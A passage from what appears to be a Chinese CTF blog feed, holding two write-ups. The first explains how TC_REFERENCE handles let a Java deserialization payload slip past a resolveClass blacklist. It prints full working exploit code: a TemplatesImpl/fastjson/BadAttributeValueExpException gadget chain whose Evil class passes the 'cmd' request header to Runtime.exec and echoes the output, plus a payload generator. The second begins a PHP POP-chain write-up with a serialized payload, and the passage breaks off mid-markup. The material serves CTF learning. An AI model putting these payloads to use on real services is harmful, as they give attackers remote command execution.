class_">InvalidClassException</span>(<span class="string">&quot;You can&#x27;t use class&quot;</span>, cls.getName());</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">contains</span><span class="params">(String targetValue)</span> &#123;</span><br><span class="line">      <span class="keyword">for</span> (String forbiddenPackage : blacklist) &#123;</span><br><span class="line">         <span class="keyword">if</span> (targetValue.matches(forbiddenPackage))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>contains方法会检测是否包含黑名单中的类</p></blockquote><p>但是想要绕开resolveClass来反序列化还是有可能的，回到之前的</p><p><code>java.io.ObjectInputStream#readObject0</code>方法，由于readClassDesc方法会走向resolveClass，因此要选择分支中方法后续不会调用readClassDesc的，符合的分支有TC_NULL<code>、</code>TC_REFERENCE<code>、</code>TC_STRING<code>、</code>TC_LONGSTRING<code>、</code>TC_EXCEPTION ，string与null这种对我们毫无用处的，exception类型则是解决序列化终止相关，因此我们只剩下引用类型这一个选择，只要让我们的恶意类成为引用类型，就能让其绕过resolveClass的检查</p><h3 id="引用类型"><a href="#引用类型" class="headerlink" title="引用类型"></a>引用类型</h3><p>在List、set、map类型中添加同样对象时，为节省资源，第二个加入的对象会改成第一个对象的引用，以ArrayList为例,写一个简单的demo</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        ArrayList&lt;Object&gt; arrayList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        arrayList.add(templates);</span><br><span class="line">        arrayList.add(templates);</span><br><span class="line">        ByteArrayOutputStream by=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        ObjectOutputStream a=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(by);</span><br><span class="line">        a.writeObject(arrayList);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>这里直接跟进一下ArrayList的writeObject方法</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException&#123;</span><br><span class="line">    <span class="comment">// Write out element count, and any hidden stuff</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">expectedModCount</span> <span class="operator">=</span> modCount;</span><br><span class="line">    s.defaultWriteObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write out size as capacity for behavioural compatibility with clone()</span></span><br><span class="line">    s.writeInt(size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write out all elements in the proper order.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">        s.writeObject(elementData[i]);<span class="comment">//🌟🌟List中的每个元素分别writeObject</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (modCount != expectedModCount) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConcurrentModificationException</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>跟进到<code>ObjectOutputStream#writeObject</code> -&gt; <code>ObjectOutputStream#writeObject0</code></p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject0</span><span class="params">(Object obj, <span class="type">boolean</span> unshared)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">oldMode</span> <span class="operator">=</span> bout.setBlockDataMode(<span class="literal">false</span>);</span><br><span class="line">        depth++;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// handle previously written and non-replaceable objects</span></span><br><span class="line">            <span class="type">int</span> h;</span><br><span class="line">            <span class="keyword">if</span> ((obj = subs.lookup(obj)) == <span class="literal">null</span>) &#123;</span><br><span class="line">                writeNull();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!unshared &amp;&amp; (h = handles.lookup(obj)) != -<span class="number">1</span>) &#123;<span class="comment">//🌟🌟在handles查询这个对象是否被序列化过</span></span><br><span class="line">                writeHandle(h);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Class) &#123;</span><br><span class="line">                writeClass((Class) obj, unshared);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ObjectStreamClass) &#123;</span><br><span class="line">                writeClassDesc((ObjectStreamClass) obj, unshared);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//.....</span></span><br><span class="line">          </span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><blockquote><p>如果上述查找后发现这个是个之前没被序列化的新对象，之后会进入到writeNonProxyDesc进而把新对象加入到handles这个HashTable中<br>具体调用链</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202311292216942.png"                      alt="image-20231129182815527"                ><figcaption>image-20231129182815527</figcaption></figure></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202311292216845.png"                      alt="image-20231129182829338"                ><figcaption>image-20231129182829338</figcaption></figure></p></blockquote><p>因此第二个序列化同一个对象时，会直接满足</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!unshared &amp;&amp; (h = handles.lookup(obj)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                writeHandle(h);</span><br><span class="line">                <span class="keyword">return</span>;&#125;</span><br></pre></td></tr></table></figure></div><p>跟进writeHandlem,可以发现被记录为引用类型</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeHandle</span><span class="params">(<span class="type">int</span> handle)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    bout.writeByte(TC_REFERENCE);</span><br><span class="line">    bout.writeInt(baseWireHandle + handle);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>至此，利用引用类型成功绕过了resolveClass的检查，大概exp如下面的伪代码</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;ClassPool.getDefault().get(Evil.class.getName()).toBytecode()&#125;);</span><br><span class="line">setValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;sloth&quot;</span>);</span><br><span class="line">setValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">jsonArray.add(templates);<span class="comment">//第一次加入</span></span><br><span class="line"></span><br><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">bd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">setValue(bd,<span class="string">&quot;val&quot;</span>,jsonArray);</span><br><span class="line"></span><br><span class="line"><span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">hashMap.put(templates,bd);<span class="comment">//第二次加入构造引用类型</span></span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">objectOutputStream.writeObject(hashMap);</span><br><span class="line"><span class="type">byte</span>[] bytes1 = byteArrayOutputStream.toByteArray();</span><br><span class="line">System.out.println(base64Encode(bytes1));</span><br><span class="line">objectOutputStream.close();</span><br></pre></td></tr></table></figure></div><h2 id="0x02-exp"><a href="#0x02-exp" class="headerlink" title="0x02 exp"></a>0x02 exp</h2><h3 id="不出网"><a href="#不出网" class="headerlink" title="不出网"></a>不出网</h3><p>由于此题不出网，比较常见的思路是打内存马，但是这题有一个Agent实时扫描（suagent-loader.jar）</p><p>再加上此题注入内存马会因为一个NullPointerException而提前终止，改为用无文件直接回显，使用的时候需要在请求报文中加入header cmd: 命令</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRequestAttributes&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> m.invoke(<span class="literal">null</span>);</span><br><span class="line">        c = Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;org.springframework.web.context.request.ServletRequestAttributes&quot;</span>);</span><br><span class="line">        m = c.getMethod(<span class="string">&quot;getResponse&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m1</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRequest&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">resp</span> <span class="operator">=</span> m.invoke(o);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">req</span> <span class="operator">=</span> m1.invoke(o); <span class="comment">// HttpServletRequest</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">getWriter</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;javax.servlet.ServletResponse&quot;</span>).getDeclaredMethod(<span class="string">&quot;getWriter&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getHeader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;javax.servlet.http.HttpServletRequest&quot;</span>).getDeclaredMethod(<span class="string">&quot;getHeader&quot;</span>,String.class);</span><br><span class="line">        getHeader.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        getWriter.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">writer</span> <span class="operator">=</span> getWriter.invoke(resp);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> (String)getHeader.invoke(req, <span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        String[] commands = <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">3</span>];</span><br><span class="line">        <span class="type">String</span> <span class="variable">charsetName</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;window&quot;</span>) ? <span class="string">&quot;GBK&quot;</span>:<span class="string">&quot;UTF-8&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toUpperCase().contains(<span class="string">&quot;WIN&quot;</span>)) &#123;</span><br><span class="line">            commands[<span class="number">0</span>] = <span class="string">&quot;cmd&quot;</span>;</span><br><span class="line">            commands[<span class="number">1</span>] = <span class="string">&quot;/c&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            commands[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">            commands[<span class="number">1</span>] = <span class="string">&quot;-c&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        commands[<span class="number">2</span>] = cmd;</span><br><span class="line">        writer.getClass().getDeclaredMethod(<span class="string">&quot;println&quot;</span>, String.class).invoke(writer, <span class="keyword">new</span> <span class="title class_">Scanner</span>(Runtime.getRuntime().exec(commands).getInputStream(),charsetName).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next());</span><br><span class="line">        writer.getClass().getDeclaredMethod(<span class="string">&quot;flush&quot;</span>).invoke(writer);</span><br><span class="line">        writer.getClass().getDeclaredMethod(<span class="string">&quot;close&quot;</span>).invoke(writer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>直接将请求头cmd的内容传入exec执行，将命令的输出写回到 <code>ServletResponse</code> 的输出流中。</p></blockquote><p>总体exp</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctf.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> com.ctf.controller.EvilController;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64Encode</span><span class="params">(<span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="keyword">return</span> encoder.encodeToString(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;ClassPool.getDefault().get(Evil.class.getName()).toBytecode()&#125;);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;sloth&quot;</span>);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">bd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        setValue(bd,<span class="string">&quot;val&quot;</span>,jsonArray);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(templates,bd);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(hashMap);</span><br><span class="line">        <span class="type">byte</span>[] bytes1 = byteArrayOutputStream.toByteArray();</span><br><span class="line">        System.out.println(base64Encode(bytes1));</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202311292216429.png"                      alt="image-20231129221646083"                ><figcaption>image-20231129221646083</figcaption></figure></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> JavaSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fastjson </tag>
            
            <tag> java </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ez_overwrite-出题记录/wp</title>
      <link href="/2023/10/22/ez-overwrite-%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95-wp/"/>
      <url>/2023/10/22/ez-overwrite-%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95-wp/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00 序言"></a>0x00 序言</h2><p>校赛出的一道php的wp，记录一下</p><h2 id="0x01-解析"><a href="#0x01-解析" class="headerlink" title="0x01 解析"></a>0x01 解析</h2><p>考点：反序列化、php8新特性、软链接读文件、opcache伪造</p><p>首先是反序列化，源码中给了A、B、C三个类，入口点是C的<code>wakeup</code>，可以触发<code>$this-&gt;file</code>的<code>toString</code>,选择B类的toString触发。B类的toString是链式调用，可以用于触发get，跟进的B的get中的<code>$func()</code>可以设置function属性位A类，触发其invoke，之后只要满足A类的number属性是<code>next_challenge</code>即可，这里number是私有属性，编写pop的时候用构造函数赋值，payload如下</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$number</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;number =<span class="string">&quot;next_challenge&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fans</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>,<span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;file=<span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;file-&gt;fans=<span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;file-&gt;fans-&gt;<span class="function"><span class="keyword">function</span>=<span class="title">new</span> <span class="title">A</span>(<span class="params"></span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br><span class="line"><span class="comment">//?pop=O%3A1%3A%22C%22%3A2%3A%7Bs%3A4%3A%22file%22%3BO%3A1%3A%22B%22%3A1%3A%7Bs%3A4%3A%22fans%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A4%3A%22fans%22%3BN%3Bs%3A8%3A%22function%22%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A9%3A%22%00A%00number%22%3Bs%3A14%3A%22next_challenge%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D</span></span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Congratulations!Next challenge is in final_challenge_.php.Your key is dgdr_09hsqhy8</span><br></pre></td></tr></table></figure></div><p>根据回显进入final_challenge_.php,根据提示传参key得到源码,</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 